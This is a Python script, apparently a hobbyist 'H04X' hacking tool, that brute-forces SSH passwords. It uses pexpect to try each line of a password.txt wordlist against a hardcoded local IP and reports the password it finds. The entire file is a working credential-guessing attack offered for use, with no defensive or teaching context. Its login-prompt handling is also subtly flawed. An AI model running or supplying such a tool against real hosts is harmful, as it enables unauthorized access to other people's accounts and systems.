#!/usr/bin/python3
try:
    import pexpect
    from termcolor import colored
except ModuleNotFoundError as e:
    print(e)
    print("INSTALL REQUIRED MODULES")
print(colored(r'''
    --------- |     | 0000000    /\    /\     0000   000000000000000000000000000000000000000000000000000000
        |     |_____| 0     0   /  \  /  \   0    0  0                       0000000     0000      00000000
        |     |     | 0     0  /    \/    \  000000  0000000                 0          0    0        0
        |     |     | 0000000 /            \ 0    0         0      \ THE /   0          000000        0
        |                    /              \               0        ___     0000000    0    0        0
        | 000000000000000000000000000000000000000000000000000                                         0
        |                                                                                             0
                                                        --- THE H04X
''',"red" , attrs=["bold" , "underline"])
)
def errors():
    print("CONNECTION ERROR")
    exit(0)

def conn(user , passwd , host):
    prompt = ["# " , "$ " , ">>> " , "> " , "\$ "]
    expected_string = "Are you sure you want to continue connecting"
    string = "ssh " + user + "@" + host
    child = pexpect.spawn(string)
    ret = child.expect([pexpect.TIMEOUT , expected_string , '[P|p]assword'])
    if ret :
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT ,'[P|p]assword'])
        if ret:
            child.sendline(passwd)
            child.expect(prompt , timeout=0.5)
            return child
        else:
           errors()

    else :
       errors()

if __name__ == "__main__":
    user = input("ENTER THE USERNAME :")
    host = "192.168.43.94"
    with open("password.txt") as file:
        for passwd in file.readlines():
            passwd = passwd.strip("\n")
            try :
                connection= conn(user , passwd  , host)
                print("\n\npassword found  " + passwd)
                break
            except:
                print(colored("\nwrong password    ", "red" , "on_yellow" , attrs=["bold"]) + passwd)


